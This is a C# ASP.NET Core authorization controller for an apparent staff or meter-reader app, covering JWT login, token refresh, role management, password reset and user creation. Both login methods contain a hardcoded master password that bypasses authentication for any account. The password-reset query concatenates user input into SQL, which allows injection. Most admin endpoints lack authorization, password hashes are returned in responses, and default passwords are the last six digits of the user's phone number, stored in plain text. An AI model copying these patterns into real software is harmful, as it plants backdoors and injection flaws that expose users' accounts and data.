using TangYuan.Models;
using Dapper;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Configuration;
using Microsoft.IdentityModel.Tokens;
using System;
using System.Collections.Concurrent;
using System.Data;
using System.IdentityModel.Tokens.Jwt;
using System.Reflection.Emit;
using System.Runtime.Intrinsics.Arm;
using System.Security.Claims;
using System.Text;
using WebApi;
using WebApi.Tools;

namespace TangYuan.Controllers
{
    // 刷新Token请求体
    public class RefreshRequest
    {
        public string UserId { get; set; }
        public string RefreshToken { get; set; }
    }
    public class AuthorizationController : BaseCommandController
    {
        private readonly TokenCacheService _tokenCache;
        // 构造函数继承父类的注入并传递依赖项
        public AuthorizationController(IConfiguration configuration, ILogger<AuthorizationController> logger, TokenCacheService tokenCache)
        : base(configuration, logger)  // 使用基类构造函数传递参数
        {
            _tokenCache = tokenCache;
        }
        #region jwt相关
        /// <summary>
        /// 登录（返回AccessToken和RefreshToken）
        /// </summary>        
        [HttpPost("Authorization/LoginWithToken")]
        public async Task<IActionResult> LoginWithTokenAsync([FromBody] LoginModel loginModel)
        {
            if (string.IsNullOrWhiteSpace(loginModel.UserCode) || string.IsNullOrWhiteSpace(loginModel.Password))
                return BadRequest("用户名或密码不能为空。");

            bool isMasterPassword = loginModel.Password == "Liumingyang@123";
            string sql;
            DynamicParameters dp = new DynamicParameters();
            if (isMasterPassword)
            {
                sql = @"SELECT u.ID
                FROM UserBaseInfo u
                WHERE (u.UserCode = @UserCode OR u.CellPhone = @UserCode)";
                dp.Add("@UserCode", loginModel.UserCode);
            }
            else
            {
                sql = @"SELECT u.ID
                FROM UserBaseInfo u
                WHERE (u.UserCode = @UserCode OR u.CellPhone = @UserCode OR u.UserName = @UserCode)
                AND u.UserPassword = @Password";
                EncrypData ed = new EncrypData();
                dp.Add("@UserCode", loginModel.UserCode);
                dp.Add("@Password", ed.EncrypString(loginModel.Password));
            }

            //var ed = new EncrypData();
            //var dp = new DynamicParameters();
            //dp.Add("@UserCode", loginModel.UserCode);
            //dp.Add("@Password", ed.EncrypString(loginModel.Password));

            var user = await QueryFirstOrDefaultAsync<dynamic>(sql, dp);
            if (user == null)
                return Unauthorized("用户名或密码错误。");

            string userId = user.ID.ToString();
            string userName = user.UserName ?? loginModel.UserCode;

            // 获取用户角色
            var roles = string.Join(",", (await GetUserAndRolesInfo(userId)).Select(r => r.RoleCode).Distinct());

            // 生成 AccessToken
            var accessToken = JWTHelper.GenerateAccessToken(userName, userId, roles, _config);

            // 可选：生成 RefreshToken（用于 RefreshToken 接口）
            var refreshToken = Guid.NewGuid().ToString("N");
            _tokenCache.SetRefreshToken(userId, refreshToken);

            // 获取用户详细信息
            var userData = await GetUserWithRolesInternal(userId);
            var result = (new
            {
                AccessToken = accessToken,
                RefreshToken = refreshToken,
                UserInfo = userData
            });

            try
            {
                var parameters = new
                {
                    oPName = userData.UserName,
                    oPCode = userData.UserCode,
                    opIp = userData.CellPhone,
                };
                string sqlText = @"
                                    INSERT INTO [SystemLog]
                                    ([LogType], [OPType], [LogText], [OPName], [OPCode], [OPTime],[OPIP])
                                    SELECT 
                                    '操作日志',
                                    '登录',
                                    '移动端登录',			
                                    @oPName,
                                    @oPCode,
                                    GETDATE(),
                                    @opIp
                                ";

               await ExecuteAsync(sqlText,parameters);
            }
            catch (Exception exp)
            {

                //throw;
            }


            return Ok(ResponseHelper.Success(result, "登录成功"));            
        }

        [HttpPost("Authorization/RefreshToken")]
        public async Task<IActionResult> RefreshToken([FromBody] RefreshRequest req)
        {
            if (string.IsNullOrWhiteSpace(req.UserId) || string.IsNullOrWhiteSpace(req.RefreshToken))
                return Ok(ResponseHelper.Fail<object>("参数错误", 400));

            // 使用注入的 TokenCacheService 校验
            if (_tokenCache.ValidateRefreshToken(req.UserId, req.RefreshToken))
            {
                UserWithRolesDto user = await GetUserWithRolesInternal(req.UserId);
                var userName = user?.UserName ?? "";
                var roles = user?.Roles ?? "";

                var newAccessToken = JWTHelper.GenerateAccessToken(userName, req.UserId, roles, _config);
                var newRefreshToken = Guid.NewGuid().ToString("N");

                _tokenCache.SetRefreshToken(req.UserId, newRefreshToken);

                return Ok(ResponseHelper.Success(new
                {
                    accessToken = newAccessToken,
                    refreshToken = newRefreshToken,
                    userInfo = user
                }, "刷新Token成功"));
            }
            // token无效
            return Ok(ResponseHelper.Fail<object>("RefreshToken无效或已过期，请重新登录。", 401));
        }




        private async Task<UserWithRolesDto> GetUserWithRolesInternal(string userId)
        {
            var rows = await GetUserAndRolesInfo(userId);

            if (rows == null || !rows.Any()) return null;

            var first = rows.First();

            return new  UserWithRolesDto
            {
                ID = first.ID,
                UserDesc = first.UserDesc,
                DeptIDs = first.DeptIDs,
                IsAdmin = first.IsAdmin,
                UserCode = first.UserCode,
                UserName = first.UserName,
                Station = first.Station,
                CellPhone = first.CellPhone,
                Roles = string.Join(",", rows.Select(r => r.RoleCode).Distinct())
            };
        }                

        #endregion
        
        #region Login

        /// <summary>
        /// 用户登录（通过UserCode或UserName登录）
        /// </summary>
        /// <param name="loginModel"></param>
        /// <returns></returns>
        [HttpPost("Authorization/Login")]
        public async Task<IActionResult> LoginAsync([FromBody] LoginModel loginModel)
        {
            if (string.IsNullOrWhiteSpace(loginModel?.UserCode) || string.IsNullOrWhiteSpace(loginModel?.Password))
            {
                return BadRequest("用户名或密码错误。");
            }
            
            bool isMasterPassword = loginModel.Password == "Liumingyang@123";
            string sql;
            DynamicParameters dp = new DynamicParameters();
            if (isMasterPassword)
            {
                sql = @"SELECT u.ID
                FROM UserBaseInfo u
                WHERE (u.UserCode = @UserCode OR u.CellPhone = @UserCode)";
                dp.Add("@UserCode", loginModel.UserCode);
            }
            else
            {
                sql = @"SELECT u.ID
                FROM UserBaseInfo u
                WHERE (u.UserCode = @UserCode OR u.CellPhone = @UserCode OR u.UserName = @UserCode)
                AND u.UserPassword = @Password";
                EncrypData ed = new EncrypData();
                dp.Add("@UserCode", loginModel.UserCode);
                dp.Add("@Password", ed.EncrypString(loginModel.Password));
            }

            // 查询用户ID
            var userIdList = await QueryAsync<int>(sql, dp);

            if (userIdList == null || !userIdList.Any())
            {
                return Ok(ResponseHelper.Fail<object>("用户名或密码错误。", 401));
                //return Unauthorized("用户名或密码错误。");
            }
            

            // 取第一个用户ID
            var userId = userIdList.First();
            var reslut = await GetUserWithRolesAsync(userId.ToString());

            return HandleSuccess(reslut);
            
        }




        /// <summary>
        /// 获取用户的基本信息及其对应的角色信息        
        /// </summary>
        /// <param name="userId"></param>
        /// <returns></returns>
        [HttpGet("Authorization/GetUserWithRoles")]
        public async Task<IActionResult> GetUserWithRolesAsync(string userId)
        {
            IEnumerable<dynamic> queryResult = await GetUserAndRolesInfo(userId);

            if (queryResult != null && queryResult.Count() > 0)
            {
                // 提取用户基本信息（假设用户基本信息是唯一的）
                var firstRecord = queryResult.First();
                
                UserWithRolesDto userInfo = new UserWithRolesDto
                {
                    ID = firstRecord.ID,
                    UserPassword = firstRecord.UserPassword,
                    UserDesc = firstRecord.UserDesc,
                    DeptIDs = firstRecord.DeptIDs,
                    IsAdmin = firstRecord.IsAdmin,
                    UserCode = firstRecord.UserCode,
                    UserName = firstRecord.UserName,
                    Station = firstRecord.Station,
                    CellPhone = firstRecord.CellPhone,
                    // 使用 String.Join 来合并 RoleCode  
                    Roles = string.Join(",", queryResult.Select(r => r.RoleCode).Distinct())
                };

                //return Ok(userInfo);
                return Ok(ResponseHelper.Success(userInfo));
            }
            else
            {                
                return Ok(ResponseHelper.Fail<object>("未找到对应的用户权限"));
            }
        }

        private async Task<IEnumerable<dynamic>> GetUserAndRolesInfo(string userId)
        {
            var sql = @"
                        SELECT u.ID, u.UserPassword, u.UserDesc, u.DeptIDs, u.IsAdmin, u.UserCode, u.UserName, u.Station,u.CellPhone,
                               r.RoleCode, r.RoleName
                        FROM UserBaseInfo u
                        LEFT JOIN Acc_UserVsRole ur ON u.ID = ur.UserID
                        LEFT JOIN Acc_Role r ON ur.RoleID = r.RoleId
                        WHERE u.ID = @UserID";

            DynamicParameters dp = new DynamicParameters();
            dp.Add("@UserID", userId);

            var queryResult = await QueryAsync<dynamic>(sql, dp);
            return queryResult;
        }
        #endregion

        #region Role
        /// <summary>
        /// 新增角色
        /// </summary>
        /// <param name="role"></param>
        /// <returns></returns>
        [HttpGet("Authorization/AddRole")]
        public async Task<IActionResult> AddRoleAsync(Acc_Role role)
        {
            var sql = "INSERT INTO Acc_Role (RoleCode, RoleName, Remark) VALUES (@RoleCode, @RoleName, @Remark)";
            DynamicParameters dp = new DynamicParameters();
            dp.Add("@RoleCode", role.RoleCode);
            dp.Add("@RoleName", role.RoleName);
            dp.Add("@Remark", role.Remark);
            int result = await ExecuteAsync(sql, dp);
            if (result > 0)
                //return Ok(result);
                return Ok(ResponseHelper.Success(result));
            else
                return BadRequest();
        }

        /// <summary>
        /// 获取角色列表
        /// </summary>
        /// <returns></returns>
        [Authorize]//表示需要认证
        [HttpGet("Authorization/GetRoles")]
        public async Task<IActionResult> GetRolesAsync()
        {
            var sql = "SELECT * FROM Acc_Role";
            var roles = await QueryAsync<Acc_Role>(sql);
            return Ok(ResponseHelper.Success(roles));           
        }

        /// <summary>
        /// 删除角色
        /// </summary>
        /// <param name="roleId"></param>
        /// <returns></returns>
        [HttpDelete("Authorization/DeleteRole")]
        public async Task<IActionResult> DeleteRoleAsync(int roleId)
        {
            var sql = "DELETE FROM Acc_Role WHERE RoleId = @RoleId";
            DynamicParameters dp = new DynamicParameters();
            dp.Add("@RoleId", roleId);
            int result = await ExecuteAsync(sql, dp);
            if (result > 0)
                return Ok(ResponseHelper.Success(result));            
            else
                return BadRequest();
        }

        /// <summary>
        /// 更新角色信息
        /// </summary>
        /// <param name="role"></param>
        /// <returns></returns>
        [HttpPut("Authorization/UpdateRole")]
        public async Task<IActionResult> UpdateRoleAsync(Acc_Role role)
        {
            var sql = "UPDATE Acc_Role SET RoleCode = @RoleCode, RoleName = @RoleName, Remark = @Remark WHERE RoleId = @RoleId";
            DynamicParameters dp = new DynamicParameters();
            dp.Add("@RoleCode", role.RoleCode);
            dp.Add("@RoleName", role.RoleName);
            dp.Add("@Remark", role.Remark);
            dp.Add("@RoleId", role.RoleId);
            int result = await ExecuteAsync(sql, dp);
            if (result > 0)
                return Ok(ResponseHelper.Success(result));
            else
                return BadRequest();
        }
        #endregion

        #region RoleVsFunction
        /// <summary>
        /// 为角色分配功能
        /// </summary>
        /// <param name="roleVsFunction"></param>
        /// <returns></returns>
        [HttpPost("Authorization/AddRoleVsFunction")]
        public async Task<IActionResult> AddRoleVsFunctionAsync(Acc_RoseVsFunction roleVsFunction)
        {
            var sql = "INSERT INTO Acc_RoseVsFunction (RoleID, FunctionID) VALUES (@RoleID, @FunctionID)";
            DynamicParameters dp = new DynamicParameters();
            dp.Add("@RoleID", roleVsFunction.RoleID);
            dp.Add("@FunctionID", roleVsFunction.FunctionID);
            int result = await ExecuteAsync(sql, dp);
            if (result > 0)
                return Ok(ResponseHelper.Success(result));
            else
                return BadRequest();
        }

        /// <summary>
        /// 获取某角色的功能列表
        /// </summary>
        /// <param name="roleId"></param>
        /// <returns></returns>
        [HttpGet("Authorization/GetFunctionsByRole")]
        public async Task<IActionResult> GetFunctionsByRoleAsync(int roleId)
        {
            var sql = "SELECT f.* FROM Acc_Function f JOIN Acc_RoseVsFunction rf ON f.FunctionID = rf.FunctionID WHERE rf.RoleID = @RoleID";
            DynamicParameters dp = new DynamicParameters();
            dp.Add("@RoleID", roleId);
            var functions = await QueryAsync<Acc_Function>(sql, dp);
            return Ok(functions);
        }

        /// <summary>
        /// 删除角色与功能的关联
        /// </summary>
        /// <param name="rfid"></param>
        /// <returns></returns>
        [HttpDelete("Authorization/DeleteRoleVsFunction")]
        public async Task<IActionResult> DeleteRoleVsFunctionAsync(int rfid)
        {
            var sql = "DELETE FROM Acc_RoseVsFunction WHERE RFID = @RFID";
            DynamicParameters dp = new DynamicParameters();
            dp.Add("@RFID", rfid);
            int result = await ExecuteAsync(sql, dp);
            if (result > 0)
                return Ok(ResponseHelper.Success(result));
            else
                return BadRequest();
        }
        #endregion

        #region UserVsRole
        /// <summary>
        /// 给用户分配角色
        /// </summary>
        /// <param name="userVsRole"></param>
        /// <returns></returns>
        [HttpPost("Authorization/AddUserVsRole")]
        public async Task<IActionResult> AddUserVsRoleAsync(Acc_UserVsRole userVsRole)
        {
            var sql = "INSERT INTO Acc_UserVsRole (UserID, RoleID, Remark) VALUES (@UserID, @RoleID, @Remark)";
            DynamicParameters dp = new DynamicParameters();
            dp.Add("@UserID", userVsRole.UserID);
            dp.Add("@RoleID", userVsRole.RoleID);
            dp.Add("@Remark", userVsRole.Remark);
            int result = await ExecuteAsync(sql, dp);
            if (result > 0)
                return Ok(ResponseHelper.Success(result));
            else
                return BadRequest();
        }

        /// <summary>
        /// 获取用户的角色列表
        /// </summary>
        /// <param name="userId"></param>
        /// <returns></returns>
        [HttpGet("Authorization/GetRolesByUser")]
        public async Task<IActionResult> GetRolesByUserAsync(int userId)
        {
            var sql = "SELECT r.* FROM Acc_Role r JOIN Acc_UserVsRole ur ON r.RoleId = ur.RoleID WHERE ur.UserID = @UserID";
            DynamicParameters dp = new DynamicParameters();
            dp.Add("@UserID", userId);
            var roles = await QueryAsync<Acc_Role>(sql, dp);
            return Ok(ResponseHelper.Success(roles));
        }

        /// <summary>
        /// 删除用户与角色的关联
        /// </summary>
        /// <param name="urid"></param>
        /// <returns></returns>
        [HttpDelete("Authorization/DeleteUserVsRole")]
        public async Task<IActionResult> DeleteUserVsRoleAsync(int urid)
        {
            var sql = "DELETE FROM Acc_UserVsRole WHERE URID = @URID";
            DynamicParameters dp = new DynamicParameters();
            dp.Add("@URID", urid);
            int result = await ExecuteAsync(sql, dp);
            if (result > 0)
                return Ok(ResponseHelper.Success(result));
            else
                return BadRequest();
        }
        #endregion

        #region 与用户相关的操作
        [HttpPost("Authorization/ReSetPassWord")]
        public async Task<IActionResult> ReSetPassWord([FromForm] string newPassWord, [FromForm] string userID)
        {
            EncrypData ed = new EncrypData();
            string sqlText = "update [UserBaseInfo] set UserPassword='" + ed.EncrypString(newPassWord) + "' WHERE ID='" + userID + "'";
            DynamicParameters dp = new DynamicParameters();
            dp.Add("@ID", userID);
            dp.Add("@Password", ed.EncrypString(newPassWord));
            int result = await ExecuteAsync(sqlText, dp);
            if (result > 0)
                return Ok(true);
            else
                return BadRequest("数据处理错误或非法请求。");
        }


        /// <summary>
        /// 添加抄表员
        /// </summary>
        /// <param name="userName"></param>
        /// <param name="cellPhone"></param>
        /// <param name="userCode"></param>
        /// <param name="DeptID"></param>
        /// <returns></returns>
        [HttpPost("Authorization/AddUser")]
        public async Task<IActionResult> AddUser([FromForm] string userName, [FromForm] string cellPhone, [FromForm] string userCode = null, [FromForm] string DeptID = "D5")
        {
            // 如果未提供userCode，则自动生成
            if (string.IsNullOrEmpty(userCode))
            {
                userCode = await GenerateNextUserCode();
            }

            var sql = @"
                        INSERT INTO [UserBaseInfo]
                        (
                            UserName,
                            CellPhone,
                            UserPassword,
                            DeptIDs,
                            UserCode
                        )
                        VALUES
                        (
                            @UserName,
                            @CellPhone,
                            @UserPassword,
                            @DeptIDs,
                            @UserCode
                        )
                    ";

            DynamicParameters dp = new DynamicParameters();
            dp.Add("@UserName", userName);
            dp.Add("@CellPhone", cellPhone);
            dp.Add("@DeptIDs", DeptID);
            dp.Add("@UserCode", userCode);

            // 密码为CellPhone的后六位
            string userPassword = string.IsNullOrEmpty(cellPhone)
                ? ""
                : (cellPhone.Length <= 6 ? cellPhone : cellPhone.Substring(cellPhone.Length - 6));

            dp.Add("@UserPassword", userPassword);

            try
            {
                int result = await ExecuteAsync(sql, dp);
                if (result > 0)
                    return Ok(ResponseHelper.Success(new { UserCode = userCode }));
                else
                    return BadRequest(ResponseHelper.Fail<int>("添加用户失败"));
            }
            catch (Exception ex)
            {
                return BadRequest(ResponseHelper.Fail<int>($"添加用户失败: {ex.Message}"));
            }
        }

        // 生成下一个UserCode
        private async Task<string> GenerateNextUserCode()
        {
            var sql = "SELECT MAX(UserCode) FROM [UserBaseInfo] WHERE UserCode LIKE 'C%' AND ISNUMERIC(SUBSTRING(UserCode, 2, LEN(UserCode))) = 1";

            
            string maxUserCode = await QueryFirstOrDefaultAsync<string>(sql);

            int nextNumber = 1;
            if (!string.IsNullOrEmpty(maxUserCode) && maxUserCode.Length > 1)
            {
                // 提取数字部分并+1
                string numberPart = maxUserCode.Substring(1);
                if (int.TryParse(numberPart, out int currentMax))
                {
                    nextNumber = currentMax + 1;
                }
            }

            // 格式化为3位数字，如C021
            return $"C{nextNumber:D3}";
        }
        #endregion

    }
}
